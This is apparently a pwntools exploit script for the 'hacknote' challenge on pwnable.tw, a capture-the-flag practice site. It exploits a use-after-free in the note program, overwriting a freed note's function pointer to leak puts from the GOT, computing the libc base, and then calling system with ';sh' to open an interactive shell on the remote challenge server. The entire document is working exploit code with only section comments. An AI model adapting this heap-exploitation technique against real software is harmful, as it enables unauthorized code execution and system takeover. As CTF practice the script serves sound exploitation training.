from pwn import *
elf = context.binary = ELF('./hacknote_patched')
libc = ELF('./libc_32.so.6')
r = elf.process()
r = remote("chall.pwnable.tw", 10102)

def add(size, content:bytes):
    r.sendlineafter(b"Your choice :", str(1).encode())
    r.sendlineafter(b"Note size :", str(size).encode())
    r.sendafter(b"Content :", content)

def delete(index):
    r.sendlineafter(b"Your choice :", str(2).encode())
    r.sendlineafter(b"Index :", str(index).encode())

def show(index):
    r.sendlineafter(b"Your choice :", str(3).encode())
    r.sendlineafter(b"Index :", str(index).encode())
###############
#  LEAK GOT   #
###############
# gdb.attach(r, '''
#     b* 0x80487d3\n
#     b* 0x80488a4\n
#     b* 0x8048955\n
#     b* 0x804862B\n
#     c
# ''')
print_note = 0x804862B
add(0x30, b"a" * 0x8)  #idx = 0
add(0x30, b"b" * 0x8)  #idx = 1
delete(0)
delete(1)
add(0x8, p32(print_note) + p32(elf.got["puts"])) # idx 2
show(0)
libc.address = u32(r.recv(4)) - libc.sym["puts"]
puts = elf.got["puts"]
log.success(f"LIBC base: {hex(libc.address)}")
log.success(f"PUTS got: {hex(puts)}")
delete(2)
add(0x8, p32(libc.sym["system"]) + b";sh\0")
show(0)
r.interactive()